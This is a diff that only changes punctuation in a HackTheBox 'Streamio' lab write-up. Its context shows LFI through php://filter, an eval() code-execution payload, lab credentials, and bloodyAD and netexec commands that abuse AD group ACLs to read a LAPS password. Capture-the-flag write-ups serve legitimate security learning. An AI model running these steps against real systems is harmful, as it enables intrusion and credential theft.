@@ -1,4 +1,4 @@
-# Streamio — HackTheBox Writeup
+# Streamio - HackTheBox Writeup
 
 "StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password."
 
@@ -30,7 +30,7 @@ Relevant open ports:
 | 443  | HTTPS   | streamio.htb, watch.streamio.htb |
 | 5985 | WinRM   | Evil-WinRM access later          |
 
-Clock skew detected — sync before any work:
+Clock skew detected - sync before any work:
 
 ```bash
 ntpdate -u 10.129.35.207
@@ -44,7 +44,7 @@ echo "10.129.35.207 streamio.htb watch.streamio.htb dc.streamio.htb" | tee -a /e
 
 ---
 
-## 2. SQL Injection — watch.streamio.htb/search.php
+## 2. SQL Injection - watch.streamio.htb/search.php
 
 ### Discovery
 
@@ -129,7 +129,7 @@ Parameter fuzzing with ffuf discovered an undocumented `debug` parameter. Testin
 https://streamio.htb/admin/?debug=master.php
 ```
 
-Response included the master.php content — LFI confirmed. Source read via PHP filter:
+Response included the master.php content - LFI confirmed. Source read via PHP filter:
 
 ```
 https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
@@ -146,15 +146,15 @@ cat encoded.txt | base64 -d
 
 ### Source Code Findings
 
-**index.php** — hardcoded DB credentials:
+**index.php** - hardcoded DB credentials:
 
 ```
 DB: STREAMIO  |  User: db_admin  |  Pass: B1@hx31234567890
 ```
 
-Also sets `define('included', true)` — the guard that master.php checks.
+Also sets `define('included', true)` - the guard that master.php checks.
 
-**master.php** — unauthenticated eval() sink:
+**master.php** - unauthenticated eval() sink:
 
 ```php
 if(isset($_POST['include']))
@@ -168,7 +168,7 @@ No sanitization. The `included` constant check is bypassed by routing through `?
 
 ### Code Execution Confirmed
 
-`shell.php` — no `<?php` tags, eval() expects raw PHP:
+`shell.php` - no `<?php` tags, eval() expects raw PHP:
 
 ```php
 echo shell_exec('whoami');
@@ -223,7 +223,7 @@ Shell as `streamio\yoshihide`.
 
 ---
 
-## 5. Lateral Movement — nikk37
+## 5. Lateral Movement - nikk37
 
 ### MSSQL Enumeration
 
@@ -286,7 +286,7 @@ Password spray confirmed: `JDgodd : JDg0dd1s@d0p3cr3@t0r` is a valid domain acco
 
 ---
 
-## 7. Active Directory — LAPS Abuse
+## 7. Active Directory - LAPS Abuse
 
 ### BloodHound
 
@@ -310,7 +310,7 @@ JDgodd owns CORE STAFF, meaning full DACL control. CORE STAFF can read the LAPS-
 
 ### ACL Abuse Chain
 
-**Step 1** — Grant GenericAll on CORE STAFF to JDgodd (owner privilege):
+**Step 1** - Grant GenericAll on CORE STAFF to JDgodd (owner privilege):
 
 ```bash
 bloodyAD --host 10.129.35.207 -d streamIO.htb \
@@ -318,7 +318,7 @@ bloodyAD --host 10.129.35.207 -d streamIO.htb \
   add genericAll "CORE STAFF" JDgodd
 ```
 
-**Step 2** — Add JDgodd to CORE STAFF:
+**Step 2** - Add JDgodd to CORE STAFF:
 
 ```bash
 bloodyAD --host 10.129.35.207 -d streamIO.htb \
@@ -326,7 +326,7 @@ bloodyAD --host 10.129.35.207 -d streamIO.htb \
   add groupMember "CORE STAFF" JDgodd
 ```
 
-**Step 3** — Read LAPS password:
+**Step 3** - Read LAPS password:
 
 ```bash
 netexec ldap 10.129.35.207 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
